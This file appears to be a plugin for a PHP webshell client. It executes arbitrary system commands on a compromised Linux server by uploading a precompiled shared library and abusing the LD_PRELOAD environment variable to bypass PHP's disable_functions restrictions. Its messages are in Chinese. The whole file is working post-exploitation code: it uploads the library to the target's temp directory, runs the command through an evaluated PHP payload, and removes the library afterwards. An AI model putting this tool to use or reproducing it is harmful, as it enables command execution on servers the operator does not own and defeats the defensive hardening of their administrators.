r'''Execute commands by LD_PRELOAD environment variable on linux for PHP.

The payload is from `https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD`, thanks

'''
from typing import Union
from api import Session, logger, tablor, CommandReturnCode, Command, Plugin, CommandExecutor, CommandType, SessionType, OSType, utils, Cmdline, PHPPayload
import argparse
import base64
import json
import os

def get_plugin_class():
    return PreloadExecPlugin

class PreloadExecPlugin(Plugin, Command, CommandExecutor):
    name = "exec_by_preload"
    description = "通过Linux下的LD_PRELOAD环境变量执行系统命令"
    supported_session_types = [SessionType.PHP]
    command_name = 'exec_by_preload'
    command_type = CommandType.SYSTEM_COMMAND

    def __init__(self):
        self.parse = argparse.ArgumentParser(prog=self.command_name, description=self.description)
        self.parse.add_argument('cmd', help="要执行的linux命令")
        self.help_info = self.parse.format_help()

        self.so_path = None

    def on_loading(self, session: Session) -> bool:
        self.session = session
        return self.session.server_info.os_type in (OSType.UNIX, OSType.OSX)


    def _upload_so(self, is64bit: bool)-> bool:
        '''上传所需的动态库文件
        '''
        self.so_path = self.session.server_info.tmpdir+self.session.server_info.sep+utils.random_str(8)
        fname = f"bypass_disablefunc_x{'64' if is64bit else '86'}.so"
        logger.info(f"上传`{fname}`到`{self.so_path}`")
        if self.session.call_command(['upload', os.path.join(os.path.dirname(__file__), 'payload', fname), self.so_path]) == CommandReturnCode.SUCCESS:
            logger.info("动态库上传成功！", True)
            return True
        logger.error("动态库上传失败！")
        return False

    def exec(self, cmd: bytes) -> Union[bytes, None]:
        if self.so_path is None:
            logger.info("开始上传动态库...")
            if not self._upload_so(self.session.server_info.os_bit==64):
                return None
        ret = self.session.evalfile('payload/payload', dict(pwd=self.session.server_info.pwd, cmd=cmd, sopath=self.so_path), 0)
        if ret is None:
            return None
        ret = json.loads(ret)
        if ret['code'] == -1:
            return None
        elif ret['code'] == -2:
            logger.error("所需动态库在远程服务器不存在!")
        elif ret['code'] == 1:
            data = base64.b64decode(ret['msg'].encode())
            return data
        return None

    def run(self, args: Cmdline)-> int:
        args = self.parse.parse_args(args.options)
        ret = self.exec(args.cmd.encode())
        if ret is not None:
            print(ret.decode(self.session.options.get_option('encoding').value, 'ignore'))
        else:
            logger.error(f"系统命令`{args.cmd}`执行失败!")

        return CommandReturnCode.SUCCESS

    def on_destroy(self):
        if self.so_path is not None:
            code = r'''
            function run($vars){
                unlink($vars['sopath']);
            }
            '''
            payload = PHPPayload(code.encode(), dict(sopath=self.so_path))
            self.session.eval(payload)